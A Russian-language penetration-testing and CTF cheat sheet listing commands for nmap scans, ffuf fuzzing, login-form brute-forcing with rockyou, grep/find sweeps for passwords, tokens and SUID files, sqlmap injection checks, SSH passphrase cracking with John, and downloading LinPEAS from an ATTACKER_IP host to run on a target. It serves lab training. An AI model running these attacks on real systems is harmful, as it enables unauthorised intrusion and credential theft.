ШПАРГАЛКА ПО ПЕНТЕСТУ / CTF
Только для собственных стендов и систем с разрешением на тестирование.

Переменные для примеров:
IP=10.10.10.10
HOST=target.htb

============================================================
1. NMAP — РАЗВЕДКА
============================================================
nmap -sC -sV $IP
# Стандартные скрипты (-sC) и определение версий сервисов (-sV)

nmap -p- $IP
# Все 65535 TCP-портов

nmap -sC -sV -p 22,80,443 $IP
# Подробная проверка выбранных портов

nmap -sU --top-ports 20 $IP
# 20 популярных UDP-портов

============================================================
2. SECLISTS — УСТАНОВКА СЛОВАРЕЙ
============================================================
sudo apt update && sudo apt install -y seclists
# Установка SecLists в Kali (обычно /usr/share/seclists/)

git clone --depth 1 https://github.com/danielmiessler/SecLists.git ~/SecLists
# Альтернатива: скачать словари с GitHub в ~/SecLists/

sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
# Распаковать rockyou.txt, если он сжат (и распаковка ещё не сделана)

============================================================
3. FFUF — СКРЫТЫЕ ФАЙЛЫ, ДИРЕКТОРИИ И VHOST
============================================================
ffuf -u "http://$HOST/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -t 30 -ac -e .php,.txt,.bak
# Поиск скрытых путей и файлов с расширениями

ffuf -u "http://$IP/" -H "Host: FUZZ.$HOST" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
# Перебор виртуальных хостов через HTTP Host

ffuf -u "http://$HOST/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
# Убрать ответы 404

# Флаги: -ac автофильтрация; -fc HTTP-код; -fs размер ответа;
# -fr регулярное выражение; -t потоки; -e расширения.

============================================================
4. FFUF — ПЕРЕБОР ФОРМЫ АВТОРИЗАЦИИ (CTF)
============================================================
ffuf -u "http://$HOST/admin/" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -fr "Username or password invalid" -c -t 30
# Подбор пароля на разрешённом стенде; -fr скрывает ответы с ошибкой
# Названия полей user/pass брать из атрибутов name HTML-формы.

6. GREP И FIND — ПОИСК ПО ФАЙЛАМ И ВСЕЙ СИСТЕМЕ
============================================================
grep -rnoE 'vit26\{[^}]*\}' / 2>/dev/null - регулярка для поиска флагов формата 

grep -rn "password" /var/www/ 2>/dev/null
# Рекурсивный поиск password с номерами строк

grep -rniE "password|secret|token|api_key" /var/www/ 2>/dev/null
# Несколько ключевых слов, регистр не учитывается

sudo grep -rniI --exclude-dir={proc,sys,dev,run} "password" / 2>/dev/null
# Поиск по всей системе без виртуальных каталогов; может идти долго

find / -name "*.bak" 2>/dev/null
# Поиск резервных копий

find / -type f \( -name "*.env" -o -name "*.conf" \) 2>/dev/null
# Поиск конфигурационных файлов

find / -type f -perm -4000 2>/dev/null
# Поиск SUID-файлов

# 2>/dev/null скрывает ошибки доступа; -r рекурсивно; -n номер строки;
# -i без учёта регистра; -I пропуск бинарных файлов.

8. SQLMAP — БАЗОВАЯ ПРОВЕРКА SQL-ИНЪЕКЦИЙ
============================================================
sqlmap -u "http://$HOST/item.php?id=1" -p id --batch
# Проверить GET-параметр id

sqlmap -u "http://$HOST/item.php?id=1" -p id --dbs --batch
# Перечислить БД при обнаруженной SQL-инъекции

sqlmap -u "http://$HOST/login.php" --data="user=test&pass=test" -p user --batch
# Проверить POST-параметр user

sqlmap -r request.txt --batch
# Взять HTTP-запрос из файла (например, экспорт из Burp Suite)

# -u URL; -p параметр; --data POST-данные; --dbs список баз;
# -r файл запроса; --batch ответы по умолчанию.

9. /etc/hosts — ПРИВЯЗКА ДОМЕНА К IP
============================================================
echo "$IP $HOST" | sudo tee -a /etc/hosts
# Добавить локальное соответствие IP и домена

cat /etc/hosts
# Проверить записи

getent hosts "$HOST"
# Проверить разрешение имени в IP

# Зачем: сайт может работать только по домену (Host-заголовок),
# а DNS не знает адреса CTF-машины. /etc/hosts решает это локально.

11. SSH И JOHN THE RIPPER
============================================================
ssh2john id_rsa > ssh.hash
# Преобразовать защищённый SSH-ключ в формат для John

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# Подбор passphrase к ключу на учебном стенде

john --show ssh.hash
# Посмотреть уже найденные значения

chmod 600 id_rsa
# Установить безопасные права на приватный ключ

ssh -i id_rsa user@$IP
# Подключение с ключом

# Passphrase ключа и пароль учётной записи — не одно и то же.

# Скачать LinPEAS на целевую машину

curl http://<ATTACKER_IP>:8000/linpeas.sh -o /tmp/linpeas.sh
# Альтернатива через curl

chmod +x /tmp/linpeas.sh
# Выдать права на выполнение

bash /tmp/linpeas.sh
# Запустить стандартное сканирование

bash /tmp/linpeas.sh -a
# Расширенное сканирование (больше проверок)

bash /tmp/linpeas.sh | tee /tmp/linpeas.log
# Запустить сканирование и сохранить вывод в файл

grep -niE 'sudo|suid|cron|capabilit|writab|password' /tmp/linpeas.log
# Найти потенциально интересные места в отчёте

sudo -l
# Проверить команды, разрешённые через sudo
